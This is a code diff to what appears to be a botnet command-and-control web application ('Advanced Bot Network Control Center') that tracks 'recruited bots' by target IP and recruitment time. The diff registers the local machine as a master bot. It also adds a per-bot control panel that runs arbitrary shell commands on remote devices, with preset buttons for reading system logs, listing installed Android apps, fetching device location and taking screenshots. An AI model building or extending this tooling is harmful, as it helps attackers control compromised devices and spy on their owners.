@@ -1738,6 +1738,70 @@ class PersistentStorage:
 
 # Global storage instance
 persistent_storage = None
+
+async def initialize_control_bot():
+    """Initialize the local device as the control/master bot"""
+    try:
+        import socket
+        import platform
+        
+        # Get local system information
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        
+        # Create control bot ID
+        control_bot_id = f"control-{hostname}-{int(time.time())}"
+        
+        # Add to clients as master bot
+        async with clients_lock:
+            clients[control_bot_id] = {
+                "websocket": None,  # Local device doesn't need websocket
+                "meta": {
+                    "tags": ["control", "master", "admin", "local"],
+                    "exec_allowed": True,
+                    "system_info": {
+                        "hostname": hostname,
+                        "platform": platform.platform(),
+                        "ip_address": local_ip,
+                        "cpu_count": psutil.cpu_count(),
+                        "memory_total": psutil.virtual_memory().total,
+                        "python_version": platform.python_version()
+                    }
+                },
+                "last_seen": time.time(),
+                "registered_at": time.time(),
+                "command_count": 0,
+                "local_device": True  # Mark as local device
+            }
+        
+        # Store in persistent storage
+        if persistent_storage:
+            try:
+                conn = sqlite3.connect(persistent_storage.db_path)
+                cursor = conn.cursor()
+                cursor.execute("""
+                    INSERT OR REPLACE INTO recruited_bots 
+                    (bot_id, target_ip, target_os, recruitment_time, status, capabilities)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                """, (
+                    control_bot_id,
+                    local_ip,
+                    platform.system().lower(),
+                    time.time(),
+                    "active_control",
+                    json.dumps(["control", "master", "admin", "terminal", "file_management"])
+                ))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logging.error(f"Failed to store control bot: {e}")
+        
+        logging.info(f"Control bot initialized: {control_bot_id} ({hostname}@{local_ip})")
+        print(f"🤖 Control Bot initialized: {control_bot_id}")
+        
+    except Exception as e:
+        logging.error(f"Failed to initialize control bot: {e}")
+        print(f"❌ Failed to initialize control bot: {e}")
 resource_optimizer = ResourceOptimizer()
 
 def safe_mkdir(path: str):
@@ -2274,6 +2338,8 @@ UI_HTML = r"""<!DOCTYPE html>
         .terminal-error { color: #ff0080; }
         .terminal-warning { color: #ffaa00; }
         .terminal-info { color: #0080ff; }
+        .terminal-command { color: #ffffff; font-weight: bold; }
+        .terminal-output { color: #cccccc; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.3); padding: 0.2rem; margin-left: 1rem; }
         
         .file-drop-zone {
             border: 2px dashed #00ff9f;
@@ -3787,6 +3853,9 @@ Or manually execute the deployment script.
             
             if (!command) return;
             
+            // Show command being executed
+            appendToTerminal(`📤 [${target}] ${command}`, 'command');
+            
             // Use enhanced terminal API
             api('/api/terminal/execute', {
                 method: 'POST',
@@ -3794,11 +3863,43 @@ Or manually execute the deployment script.
                 body: JSON.stringify({ target, command, user_context: 'web_terminal' })
             }).then(result => {
                 if (result.status === 'success') {
-                    appendToTerminal(`📤 [${target}] ${command}`, 'command');
-                    appendToTerminal(`✅ Command executed on ${result.execution_result.results?.length || 0} devices`, 'success');
+                    const executionResult = result.execution_result;
+                    const deviceCount = executionResult.results?.length || 0;
+                    
+                    appendToTerminal(`✅ Command executed on ${deviceCount} devices`, 'success');
+                    
+                    // Display output from each device
+                    if (executionResult.results) {
+                        executionResult.results.forEach(deviceResult => {
+                            const deviceId = deviceResult.device_id || 'unknown';
+                            
+                            if (deviceResult.success) {
+                                if (deviceResult.output && deviceResult.output.trim()) {
+                                    appendToTerminal(`🖥️ Output from ${deviceId}:`, 'info');
+                                    // Display the actual command output
+                                    const outputLines = deviceResult.output.split('\n');
+                                    outputLines.forEach(line => {
+                                        if (line.trim()) {
+                                            appendToTerminal(`  ${line}`, 'output');
+                                        }
+                                    });
+                                } else {
+                                    appendToTerminal(`📝 ${deviceId}: Command completed (no output)`, 'info');
+                                }
+                                
+                                if (deviceResult.execution_time) {
+                                    appendToTerminal(`⏱️ ${deviceId}: Execution time: ${deviceResult.execution_time.toFixed(2)}s`, 'info');
+                                }
+                            } else {
+                                appendToTerminal(`❌ ${deviceId}: ${deviceResult.error || 'Command failed'}`, 'error');
+                            }
+                        });
+                    }
                 } else {
                     appendToTerminal(`❌ Terminal execution failed: ${result.error}`, 'error');
                 }
+            }).catch(error => {
+                appendToTerminal(`❌ API Error: ${error.message}`, 'error');
             });
             
             document.getElementById('commandInput').value = '';
@@ -3974,7 +4075,389 @@ Or manually execute the deployment script.
         appendToActivityLog('🚀 Advanced Bot Network Control Center initialized');
         appendToActivityLog('📡 50,000+ device support enabled');
         appendToActivityLog('🤖 Real terminal mode with device discovery active');
+        
+        // Global variable for current bot control
+        let currentControlledBot = null;
+        
+        // Bot Control Panel Functions
+        function openBotControlPanel(botId, botInfo) {
+            currentControlledBot = botId;
+            document.getElementById('botControlPanel').style.display = 'flex';
+            document.getElementById('botControlTitle').textContent = `Bot: ${botId}`;
+            
+            // Populate bot information
+            const detailsDiv = document.getElementById('botInfoDetails');
+            detailsDiv.innerHTML = `
+                <div style="font-size: 12px; color: #ccc;">
+                    <p><strong>🆔 ID:</strong> ${botId}</p>
+                    <p><strong>📍 Status:</strong> <span style="color: #00ff9f;">Online</span></p>
+                    <p><strong>🏷️ Tags:</strong> ${botInfo?.tags?.join(', ') || 'Unknown'}</p>
+                    <p><strong>⏰ Last Seen:</strong> ${new Date().toLocaleString()}</p>
+                    <p><strong>🖥️ Platform:</strong> ${botInfo?.platform || 'Unknown'}</p>
+                    <p><strong>📡 IP:</strong> ${botInfo?.ip || 'Unknown'}</p>
+                </div>
+            `;
+            
+            // Show mobile controls if it's a mobile device
+            const mobileControls = document.getElementById('mobileControls');
+            if (botInfo?.tags?.includes('mobile') || botInfo?.tags?.includes('android')) {
+                mobileControls.style.display = 'block';
+            } else {
+                mobileControls.style.display = 'none';
+            }
+            
+            // Clear previous terminal content
+            clearBotTerminal();
+            appendToBotTerminal(`🤖 Connected to bot: ${botId}`, 'success');
+        }
+        
+        function closeBotControlPanel() {
+            document.getElementById('botControlPanel').style.display = 'none';
+            currentControlledBot = null;
+        }
+        
+        function sendBotCommand(commandType) {
+            if (!currentControlledBot) return;
+            
+            const commands = {
+                'status': 'echo "Bot Status: Online" && uptime',
+                'info': 'uname -a && whoami',
+                'processes': 'ps aux | head -10',
+                'network': 'ip addr show | head -20',
+                'performance': 'free -h && df -h',
+                'logs': 'tail -20 /var/log/syslog 2>/dev/null || tail -20 /var/log/messages 2>/dev/null || echo "No logs available"',
+                'battery': 'termux-battery-status 2>/dev/null || acpi -b 2>/dev/null || echo "Battery info not available"',
+                'location': 'termux-location 2>/dev/null || echo "Location not available"',
+                'apps': 'pm list packages 2>/dev/null | head -10 || echo "App list not available"'
+            };
+            
+            const command = commands[commandType];
+            if (command) {
+                appendToBotTerminal(`📤 Executing ${commandType}...`, 'info');
+                sendBotTerminalCommandDirect(command);
+            }
+        }
+        
+        function sendBotTerminalCommand() {
+            const command = document.getElementById('botCommandInput').value.trim();
+            if (!command || !currentControlledBot) return;
+            
+            sendBotTerminalCommandDirect(command);
+            document.getElementById('botCommandInput').value = '';
+        }
+        
+        function sendBotTerminalCommandDirect(command) {
+            if (!currentControlledBot) return;
+            
+            appendToBotTerminal(`📤 [${currentControlledBot}] ${command}`, 'command');
+            
+            // Execute command on specific bot
+            api('/api/terminal/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    target: `id:${currentControlledBot}`, 
+                    command: command, 
+                    user_context: 'bot_control_panel' 
+                })
+            }).then(result => {
+                if (result.status === 'success') {
+                    const executionResult = result.execution_result;
+                    if (executionResult.results && executionResult.results.length > 0) {
+                        const botResult = executionResult.results[0];
+                        if (botResult.success && botResult.output) {
+                            appendToBotTerminal(`💬 Output:`, 'info');
+                            const outputLines = botResult.output.split('\\n');
+                            outputLines.forEach(line => {
+                                if (line.trim()) {
+                                    appendToBotTerminal(`  ${line}`, 'output');
+                                }
+                            });
+                        } else {
+                            appendToBotTerminal(`❌ ${botResult.error || 'Command failed'}`, 'error');
+                        }
+                    } else {
+                        appendToBotTerminal(`❌ No response from bot`, 'error');
+                    }
+                } else {
+                    appendToBotTerminal(`❌ Execution failed: ${result.error}`, 'error');
+                }
+            }).catch(error => {
+                appendToBotTerminal(`❌ API Error: ${error.message}`, 'error');
+            });
+        }
+        
+        function handleBotCommandKeyPress(event) {
+            if (event.key === 'Enter') {
+                sendBotTerminalCommand();
+            }
+        }
+        
+        function appendToBotTerminal(message, type = 'info') {
+            const terminal = document.getElementById('botTerminal');
+            const timestamp = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = `terminal-line terminal-${type}`;
+            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            // Keep only last 100 entries
+            while (terminal.children.length > 100) {
+                terminal.removeChild(terminal.firstChild);
+            }
+        }
+        
+        function clearBotTerminal() {
+            document.getElementById('botTerminal').innerHTML = `
+                <div class="terminal-line terminal-info">
+                    <span class="terminal-timestamp">[BOT]</span> 
+                    🤖 Bot terminal ready - Direct communication established
+                </div>
+            `;
+        }
+        
+        function exportBotLogs() {
+            const terminal = document.getElementById('botTerminal');
+            const logs = Array.from(terminal.children).map(child => child.textContent).join('\\n');
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `bot-${currentControlledBot}-logs-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        function startScreenMirror() {
+            const mirrorArea = document.getElementById('screenMirrorArea');
+            mirrorArea.style.display = 'block';
+            appendToBotTerminal('📱 Starting screen mirror...', 'info');
+            
+            // Simulate screen mirroring (placeholder for actual implementation)
+            const canvas = document.getElementById('screenMirrorCanvas');
+            canvas.innerHTML = `
+                <div style="text-align: center; color: #00ff9f;">
+                    📱 Screen Mirror Active<br>
+                    <small>Bot: ${currentControlledBot}</small><br>
+                    <div style="margin-top: 1rem; font-size: 12px; color: #666;">
+                        Note: Actual screen mirroring requires<br>
+                        device-specific implementation (ADB for Android)
+                    </div>
+                </div>
+            `;
+        }
+        
+        function takeScreenshot() {
+            if (!currentControlledBot) return;
+            appendToBotTerminal('📸 Taking screenshot...', 'info');
+            sendBotTerminalCommandDirect('screencap /sdcard/screenshot.png 2>/dev/null && echo "Screenshot saved" || echo "Screenshot failed"');
+        }
+        
+        function refreshScreen() {
+            appendToBotTerminal('🔄 Refreshing screen...', 'info');
+        }
+        
+        function toggleScreenControl() {
+            appendToBotTerminal('🎮 Screen control mode toggled', 'info');
+        }
+        
+        function restartBot() {
+            if (!currentControlledBot) return;
+            if (confirm(`Are you sure you want to restart bot ${currentControlledBot}?`)) {
+                appendToBotTerminal('🔄 Restarting bot...', 'warning');
+                sendBotTerminalCommandDirect('echo "Restart command sent" && sleep 2 && echo "Bot would restart here"');
+            }
+        }
+        
+        function disconnectBot() {
+            if (!currentControlledBot) return;
+            if (confirm(`Are you sure you want to disconnect bot ${currentControlledBot}?`)) {
+                appendToBotTerminal('🔌 Disconnecting bot...', 'warning');
+                closeBotControlPanel();
+            }
+        }
+        
+        // Modify device refresh to add click handlers for individual bot control
+        if (typeof originalRefreshDevices === 'undefined') {
+            var originalRefreshDevices = refreshDevices;
+        }
+        refreshDevices = async function() {
+            await originalRefreshDevices();
+            
+            // Add click handlers to device items for individual control
+            document.querySelectorAll('.device-item').forEach(deviceItem => {
+                deviceItem.style.cursor = 'pointer';
+                deviceItem.title = 'Click to open bot control panel';
+                deviceItem.addEventListener('click', function() {
+                    const deviceId = this.dataset.deviceId || 'unknown';
+                    const botInfo = {
+                        tags: ['mobile', 'recruited'], // This would be populated from actual device data
+                        platform: 'Android',
+                        ip: '192.168.1.100'
+                    };
+                    openBotControlPanel(deviceId, botInfo);
+                });
+            });
+        };
     </script>
+    
+    <!-- Individual Bot Control Panel -->
+    <div id="botControlPanel" class="modal" style="display: none;">
+        <div class="modal-content" style="max-width: 1200px; height: 80vh;">
+            <div class="modal-header">
+                <h3>🤖 Bot Control Center</h3>
+                <span class="close" onclick="closeBotControlPanel()">&times;</span>
+            </div>
+            <div class="modal-body" style="height: calc(100% - 80px); overflow: hidden;">
+                <div id="botControlContent" style="height: 100%; display: grid; grid-template-columns: 1fr 2fr; gap: 1rem;">
+                    <!-- Bot Information Panel -->
+                    <div class="panel" style="padding: 1rem;">
+                        <h4 id="botControlTitle">Bot Information</h4>
+                        <div id="botInfoDetails"></div>
+                        
+                        <div class="bot-control-section" style="margin-top: 1rem;">
+                            <h5>🎛️ Direct Controls</h5>
+                            <div class="bot-controls" style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem;">
+                                <button class="btn btn-secondary" onclick="sendBotCommand('status')">Status</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('info')">System Info</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('processes')">Processes</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('network')">Network</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('performance')">Performance</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('logs')">Recent Logs</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot-control-section" style="margin-top: 1rem;">
+                            <h5>📱 Mobile Controls</h5>
+                            <div id="mobileControls" style="display: none;">
+                                <button class="btn" onclick="startScreenMirror()">🖼️ Screen Mirror</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('battery')">🔋 Battery</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('location')">📍 Location</button>
+                                <button class="btn btn-secondary" onclick="sendBotCommand('apps')">📱 Apps</button>
+                            </div>
+                        </div>
+                        
+                        <div class="bot-control-section" style="margin-top: 1rem;">
+                            <h5>⚙️ Advanced</h5>
+                            <button class="btn btn-warning" onclick="restartBot()">🔄 Restart Bot</button>
+                            <button class="btn btn-danger" onclick="disconnectBot()">🔌 Disconnect</button>
+                        </div>
+                    </div>
+                    
+                    <!-- Bot Terminal/Output Panel -->
+                    <div class="panel" style="padding: 1rem; display: flex; flex-direction: column;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                            <h4>🖥️ Bot Terminal</h4>
+                            <div>
+                                <button class="btn btn-secondary" onclick="clearBotTerminal()">Clear</button>
+                                <button class="btn btn-secondary" onclick="exportBotLogs()">Export</button>
+                            </div>
+                        </div>
+                        
+                        <div class="terminal" id="botTerminal" style="flex: 1; max-height: 300px; overflow-y: auto;">
+                            <div class="terminal-line terminal-info">
+                                <span class="terminal-timestamp">[BOT]</span> 
+                                🤖 Bot terminal ready - Direct communication established
+                            </div>
+                        </div>
+                        
+                        <div style="margin-top: 1rem;">
+                            <div style="display: flex; gap: 0.5rem;">
+                                <input type="text" id="botCommandInput" class="command-input" 
+                                       placeholder="Enter command for this bot..." 
+                                       onkeypress="handleBotCommandKeyPress(event)" style="flex: 1;">
+                                <button class="btn" onclick="sendBotTerminalCommand()">Execute</button>
+                            </div>
+                        </div>
+                        
+                        <!-- Screen Mirror Area (for mobile devices) -->
+                        <div id="screenMirrorArea" style="display: none; margin-top: 1rem;">
+                            <h5>📱 Screen Mirror</h5>
+                            <div id="screenMirrorCanvas" style="border: 1px solid #00ff9f; border-radius: 8px; min-height: 200px; display: flex; align-items: center; justify-content: center; background: #1a1a2e;">
+                                <div style="text-align: center; color: #666;">
+                                    📱 Screen mirroring will appear here<br>
+                                    <small>Requires device with screen sharing capability</small>
+                                </div>
+                            </div>
+                            <div style="margin-top: 0.5rem; text-align: center;">
+                                <button class="btn btn-secondary" onclick="takeScreenshot()">📸 Screenshot</button>
+                                <button class="btn btn-secondary" onclick="refreshScreen()">🔄 Refresh</button>
+                                <button class="btn btn-secondary" onclick="toggleScreenControl()">🎮 Control</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal Styles -->
+    <style>
+    .modal {
+        position: fixed;
+        z-index: 1000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.8);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    .modal-content {
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        border: 2px solid #00ff9f;
+        border-radius: 12px;
+        max-width: 90%;
+        max-height: 90%;
+        box-shadow: 0 10px 30px rgba(0, 255, 159, 0.3);
+    }
+    
+    .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem;
+        border-bottom: 1px solid #00ff9f;
+    }
+    
+    .modal-header h3 {
+        margin: 0;
+        color: #00ff9f;
+    }
+    
+    .close {
+        color: #ff0080;
+        font-size: 28px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+    
+    .close:hover {
+        color: #ffffff;
+    }
+    
+    .bot-control-section {
+        border-top: 1px solid #333;
+        padding-top: 0.5rem;
+    }
+    
+    .bot-control-section h5 {
+        margin: 0 0 0.5rem 0;
+        color: #0080ff;
+        font-size: 14px;
+    }
+    
+    .bot-controls button {
+        font-size: 12px;
+        padding: 0.3rem 0.6rem;
+    }
+    </style>
 </body>
 </html>"""
 async def route_ui(request):
@@ -5226,6 +5709,9 @@ def main():
             await runner.setup()
             site = web.TCPSite(runner, HOST, HTTP_PORT)
             await site.start()
+            
+            # Initialize local device as control bot
+            await initialize_control_bot()
             
             # Start cleanup task
             # Start cleanup and optimization tasks
